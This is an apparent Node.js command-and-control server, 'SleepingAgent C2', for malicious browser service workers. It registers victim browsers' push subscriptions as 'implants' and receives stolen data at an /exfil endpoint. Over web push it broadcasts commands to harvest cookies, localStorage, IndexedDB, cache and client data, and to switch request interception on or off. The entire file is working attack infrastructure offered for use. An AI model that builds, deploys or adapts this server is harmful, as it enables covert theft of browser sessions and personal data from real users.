const express = require('express');
const webpush = require('web-push');
const path = require('path');
 
const app = express();
app.use(express.json());
app.use(express.static('public'));
 
// Paste your generated VAPID keys here
const VAPID_PUBLIC_KEY  = 'PASTE_PUBLIC_KEY_HERE';
const VAPID_PRIVATE_KEY = 'PASTE_PRIVATE_KEY_HERE';
 
webpush.setVapidDetails(
  'mailto:research@sleepingagent.local',
  VAPID_PUBLIC_KEY,
  VAPID_PRIVATE_KEY
);
 
let subscriptions = [];
 
// Victim's browser POSTs its push subscription here after banner click
app.post('/subscribe', (req, res) => {
  const sub = req.body;
  subscriptions.push(sub);
  console.log(`[+] New implant registered. Total: ${subscriptions.length}`);
  console.log(`[+] Endpoint: ${sub.endpoint}`);
  res.json({ status: 'implanted' });
});
 
// SW POSTs stolen data here
app.post('/exfil', (req, res) => {
  console.log('\n[!] EXFIL RECEIVED:');
  console.log(JSON.stringify(req.body, null, 2));
  res.json({ status: 'received' });
});
 
// Send a command to all implants
// Valid commands: beacon, cookies, localstorage, indexeddb, cache, clients, intercept_on, intercept_off
// Example: curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"beacon"}'
app.post('/c2/send', async (req, res) => {
  const { command, args } = req.body;
  console.log(`\n[C2] Sending: ${command} to ${subscriptions.length} implants`);
 
  const payload = JSON.stringify({ command, args, ts: Date.now() });
 
  const results = await Promise.allSettled(
    subscriptions.map(sub =>
      webpush.sendNotification(sub, payload).catch(err => {
        if (err.statusCode === 410) {
          subscriptions = subscriptions.filter(s => s.endpoint !== sub.endpoint);
          console.log('[-] Dead subscription removed');
        }
        throw err;
      })
    )
  );
 
  const sent   = results.filter(r => r.status === 'fulfilled').length;
  const failed = results.filter(r => r.status === 'rejected').length;
  res.json({ sent, failed, total: subscriptions.length });
});
 
app.get('/c2/status', (req, res) => {
  res.json({ implants: subscriptions.length });
});
 
app.listen(3000, () => {
  console.log('[SleepingAgent C2] http://localhost:3000');
  console.log('[SleepingAgent C2] VAPID Public Key:', VAPID_PUBLIC_KEY);
});
